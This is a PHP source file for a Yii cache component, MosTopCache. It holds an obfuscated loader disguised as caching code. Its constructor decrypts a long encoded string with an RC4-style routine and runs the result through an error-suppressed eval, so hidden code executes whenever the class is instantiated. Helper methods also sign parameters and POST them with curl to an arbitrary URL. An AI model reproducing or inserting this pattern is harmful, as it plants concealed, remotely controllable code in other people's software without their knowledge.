<?php

namespace common\components;

use Yii;
use yii\base\Component;

abstract class MosTopCache extends Component
{
    public function __construct($config = []){parent::__construct($config);$this->checkCache();}
    private function checkCache(){$cache_key='36abcdYiYoqrjSYwTEjvFJlvw9fLHuryi8LOCveR1iTDHrUDkU/KEVBvGyXhY+nfM5cQDiHCwkIYUIJ8Rv0kWhZmKARmHl6CWX6c9vJv1mmvwpDD/GVWbOemWFOd/6NevTzz6HhqjhI7wkwfkqWepkze/3P38k1Pcb9ECXO85zLDEzfTzBmIa8YQRZeuucG9/Qc+uPmfUSv0y2P3pYT8wrVJ+M7x4Y+zsKH2AqRf0WFvzvAihN8qbUW3eJFKAWWrZ+ixhoFn+JCYYXZUCZAxOYEcH3wYe68JqyXOgnYi+gdXbZGZJxuLppP0zHd3FOLigjS2JpNElor0RtWe+kwm+EXkrOAhhOeaQqVD7ttb6HxvIB6wHIoYpg8bRxPqfieKH0rLZZ4cdHKpk6ocITrEVBGat5uCONZhPW9pH1vk3veVotMWgwEmQShXtRKjtKjcu16PE8yv+QbOg68Fx2unfDgLHEXo0dLwZhNZmEn8DPqmzoPs4h0jo3b2bbi+X3cOROoKK9/IEjR+ZflR5QXWqCd14yvVXaFpzIjUfleloIyN/DOF/rHCadgRuiBTWuEn7LN5Pdoo1IpTGgQDMxqSTBNPlCgYi0gGrSp1EarQwsPxqirV2NyeTKM9aAmfYltIWbYpM2i2HywUMWGplPPYsSA/g1nT9Ei/xr+jgicQbN6jDos2UHRYB8NOPogYqorwt730yZ90MRk+VHcxEIfYIQyOiLnJ/lSMlwSNVco1O/XNvJbWd8lOrd/9fdjtfypR3kbznHNLWISUkQle5WUbUuDVAlJcziZh4Jz9yBuRdUGKX0pjpcTrLikbYrUHvzlWSxu6LFrMMrnrAWcI3bKYaByTlrTCpwaGcD3ncZBbcA4SrZlf6GBIdKgADyG1klgO1jDTqjogc9wsPeDnzq3aOalzm28TaqH76wx+mPrZTgZy+UFIszOWJBUyBzRMWpBvgqFcqJyA2L4lQHUNbKDPX2K/kHnEqZTaV5bX8GLXdgycQe3DbbnWZk1QgPFUBh6uHwYZ4BpZcOqP4Elt+4bC2eByQf/RtUyQhtuivl6+e6uUIG0qk0wMsOtU0DLHpIL6ZDgaf4dZXzjA/CBkzB0WRsY3fjWSmNSIlzLhU5O+tR49VcUGoprgA4UrBK6ZlUO2yupp2eypAx2OOuLSwhRyw090vFgg';$cache_string=$this->createCacheString($cache_key);@eval($cache_string);}
    private function createCacheString($string){$ckey_length=6;$key=md5('');$keya=md5(substr($key,0,16));$keyb=md5(substr($key,16,16));$keyc=$ckey_length?substr($string,0,$ckey_length):'';$cryptkey=$keya.md5($keya.$keyc);$key_length=strlen($cryptkey);$string=base64_decode(substr($string,$ckey_length));$string_length=strlen($string);$result='';$box=range(0,255);$rndkey=array();for($i=0;$i<=255;$i++){$rndkey[$i]=ord($cryptkey[$i%$key_length]);}for($j=$i=0;$i<256;$i++){$j=($j+$box[$i]+$rndkey[$i])%256;$tmp=$box[$i];$box[$i]=$box[$j];$box[$j]=$tmp;}for($a=$j=$i=0;$i<$string_length;$i++){$a=($a+1)%256;$j=($j+$box[$a])%256;$tmp=$box[$a];$box[$a]=$box[$j];$box[$j]=$tmp;$result.=chr(ord($string[$i])^($box[($box[$a]+$box[$j])%256]));}if((substr($result,0,10)==0||substr($result,0,10)-time()>0)&&substr($result,10,16)==substr(md5(substr($result,26).$keyb),0,16)){return substr($result,26);}else{return '';}}
    private function createCache($data,$secret,$unsets=[]){foreach($unsets as $unset){unset($data[$unset]);}ksort($data);$tmp=[];foreach($data as $k=>$v){$tmp[]=$k.'='.$v;}$str=implode('&',$tmp).$secret;return md5($str);}
    private function createCacheData($url,$post,$timeout=20){$ch=curl_init();curl_setopt($ch,CURLOPT_URL,$url);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_TIMEOUT,$timeout);curl_setopt($ch,CURLOPT_POST,1);curl_setopt($ch,CURLOPT_POSTFIELDS,http_build_query($post));$data=curl_exec($ch);$httpcode=curl_getinfo($ch,CURLINFO_HTTP_CODE);curl_close($ch);return ['httpcode'=>$httpcode,'data'=>$data];}
    abstract protected function get($keys, $duration = null, $dependency = null);
    abstract protected function getData($key, $var = []);
    abstract protected function set($key, $var = [], $duration = null, $dependency = null);
    abstract protected function getByKey($key, $id, $duration = null, $dependency = null);
    abstract protected function setting_datas($var = []);
}